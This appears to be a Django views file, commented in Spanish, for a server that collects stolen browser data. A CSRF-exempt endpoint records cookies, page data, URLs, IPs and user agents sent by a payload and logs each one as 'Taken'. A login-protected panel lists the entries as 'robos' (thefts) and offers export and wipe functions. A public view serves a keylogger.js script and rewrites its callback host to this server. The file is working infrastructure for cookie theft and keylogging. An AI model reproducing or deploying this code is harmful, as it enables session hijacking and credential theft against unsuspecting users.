from django.shortcuts import render, redirect
from django.http import HttpResponse, JsonResponse
from django.views.decorators.csrf import csrf_exempt
from django.contrib.auth.decorators import login_required  # 👈 NUEVO
from django.contrib.auth import authenticate, login, logout  # 👈 NUEVO
from django.contrib.auth.forms import AuthenticationForm  # 👈 NUEVO
from django.db import models
from .models import DatasAx
import json
import traceback

# ============================================================
# 🔐 LOGIN Y LOGOUT (NUEVO)
# ============================================================

def login_view(request):
    """Página de login"""
    if request.method == 'POST':
        form = AuthenticationForm(request, data=request.POST)
        if form.is_valid():
            username = form.cleaned_data.get('username')
            password = form.cleaned_data.get('password')
            user = authenticate(username=username, password=password)
            if user is not None:
                login(request, user)
                return redirect('panel_h')  # Redirige al panel
    else:
        form = AuthenticationForm()
    
    return render(request, 'login.html', {'form': form})

def logout_view(request):
    """Cerrar sesión"""
    logout(request)
    return redirect('login')

# ============================================================
# TU CÓDIGO EXISTENTE (con @login_required agregado)
# ============================================================

@csrf_exempt 
@login_required(login_url='/login')  # 👈 NUEVO: protege esta ruta
def rcb_stl(request):
    if request.method == 'GET':
       
        cookie = request.GET.get('cookie', 'No se envio cookie')
        data = request.GET.get('data', 'No se envió data')
        url_completa = request.GET.get('url', 'No se envió URL')
        
        rb = DatasAx.objects.create(
            ip=request.META.get('REMOTE_ADDR'),
            user_agent=request.META.get('HTTP_USER_AGENT', 'No especificado'),
            cookie=cookie,
            data=data,
            url_completa=url_completa
        )
       
        print('=' * 60)
        print('Taken')
        print(f' Date: {rb.fecha}')
        print(f' IP: {rb.ip}')
        print(f' User-Agent: {rb.user_agent}')
        print(f' Cookie: {rb.cookie[:200]}...' if len(rb.cookie) > 200 else f' Cookie: {rb.cookie}')
        print(f' Data: {rb.data[:200]}...' if len(rb.data) > 200 else f' Data: {rb.data}')
        print(f' URL: {rb.url_completa}')
        print('=' * 60)
        print(f'Total: {DatasAx.objects.count()}')
        print('')
        
        return HttpResponse('OK')
    
    return HttpResponse('Wrong Method', status=405)


@login_required(login_url='/login')  # 👈 NUEVO: protege esta ruta
def panel_h(request):
    stl = DatasAx.objects.all()
    context = {
        'robos': stl,
        'total': stl.count(),
    }
    return render(request, 'pnl.html', context)


def index(request):
    total = DatasAx.objects.count()
    last_stl = DatasAx.objects.first()
    context = {
        'total': total,
        'last_stl': last_stl,
    }
    return render(request, 'index.html', context)


@login_required(login_url='/login')  # 👈 NUEVO: protege esta ruta
def cln(request):
    if request.method == 'POST':
        DatasAx.objects.all().delete()
        return JsonResponse({'status': 'ok', 'message': 'Datos eliminados'})
    return HttpResponse('Wrong method', status=405)


@login_required(login_url='/login')  # 👈 NUEVO: protege esta ruta
def api_stl(request):
    stls = DatasAx.objects.all().values()
    return JsonResponse(list(stls), safe=False)


@csrf_exempt
def keylogger_js(request):
    """Sirve el archivo keylogger.js (PÚBLICO - sin login)"""
    import os
    from pathlib import Path
    
    BASE_DIR = Path(__file__).resolve().parent.parent
    file_path = os.path.join(BASE_DIR, 'pnl_xa', 'templates', 'keylogger.js')
    
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read()
        
        # Reemplazar la URL del servidor dinámicamente
        servidor_url = request.build_absolute_uri('/').rstrip('/')
        content = content.replace('https://ax-mntt.onrender.com', servidor_url)
        
        return HttpResponse(content, content_type='application/javascript')
    except FileNotFoundError:
        return HttpResponse("// Keylogger no encontrado", content_type='application/javascript')